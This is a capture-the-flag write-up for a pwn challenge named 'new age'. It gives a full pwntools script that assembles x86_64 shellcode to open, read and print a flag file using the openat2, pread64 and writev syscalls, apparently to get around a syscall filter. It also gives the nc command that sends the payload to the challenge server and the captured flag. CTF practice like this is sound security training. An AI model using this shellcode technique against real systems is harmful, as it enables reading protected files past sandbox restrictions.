# pwn - new age

```python
from pwn import *

# Set context to Linux x86_64
context.arch = 'amd64'
context.os = 'linux'

# Configuration
BINARY = './new_age'
flag_filename = "flag_name_Should_Be_R@ndom_ahahahahahahahahah.txt"

def exploit():
    # --- SHELLCODE CONSTRUCTION ---
    
    # FIX: We construct the full assembly string first, then asm() it all at once
    # or asm() the chunks separately. Here we asm() the pushstr separately.
    
    # 1. Push filename to stack
    shellcode = asm(shellcraft.pushstr(flag_filename))
    
    # 2. Open file using openat2 (syscall 437)
    shellcode += asm('''
    /* Save filename pointer to rsi */
    mov rsi, rsp

    /* Create open_how struct (24 bytes of 0x00) on stack */
    push 0
    push 0
    push 0
    mov rdx, rsp  /* rdx points to open_how */

    /* Syscall openat2(dfd, filename, how, size) */
    mov rdi, -100 /* AT_FDCWD */
    /* rsi is already set (filename) */
    /* rdx is already set (open_how) */
    mov r10, 24   /* sizeof(open_how) */
    mov rax, 437
    syscall
    
    /* Save the returned File Descriptor (FD) */
    mov r12, rax
    
    /* ------------------------------------------------ */

    /* 3. Read file using pread64 (syscall 17) */
    /* pread64(fd, buf, count, offset) */
    
    /* Allocate buffer space on stack */
    sub rsp, 0x100
    
    mov rdi, r12   /* fd */
    mov rsi, rsp   /* buf */
    mov rdx, 0x100 /* count */
    mov r10, 0     /* offset */
    mov rax, 17    /* syscall pread64 */
    syscall
    
    /* Save bytes read count */
    mov r13, rax
    
    /* ------------------------------------------------ */

    /* 4. Write to stdout using writev (syscall 20) */
    /* writev(fd, iov, iovcnt) */
    
    /* We need to construct an iovec struct: {base_ptr, len} */
    /* rsp currently points to the flag data. Save it to r14 */
    mov r14, rsp
    
    /* Move stack down to make room for iovec */
    dec rsp
    sub rsp, 16
    
    /* Build iovec */
    mov [rsp], r14    /* iov_base = pointer to flag data */
    mov [rsp+8], r13  /* iov_len = bytes read */
    
    mov rdi, 1      /* stdout */
    mov rsi, rsp    /* pointer to iovec */
    mov rdx, 1      /* iovcnt */
    mov rax, 20     /* syscall writev */
    syscall

    /* Exit cleanly */
    mov rax, 60
    xor rdi, rdi
    syscall
    ''')

    print(f"[*] Shellcode Length: {len(shellcode)} bytes")
    return shellcode

if __name__ == "__main__":
    sc = exploit()
    with open("exploit.bin", "wb") as f:
        f.write(sc)
    print("[+] Payload saved to exploit.bin")
    print("[+] Run: (cat exploit.bin; cat) | ./new_age")
```

```bash
(cat exploit.bin; cat) | nc 159.89.106.147 1337
```

`flag:0xL4ugh{D0n'tF000rgoot_k33p_up_Ieesss_withhhh_n3w_5y5c4llsssss5s5s5sss}`

SOLVED by Ha1qal

Solved by: yappare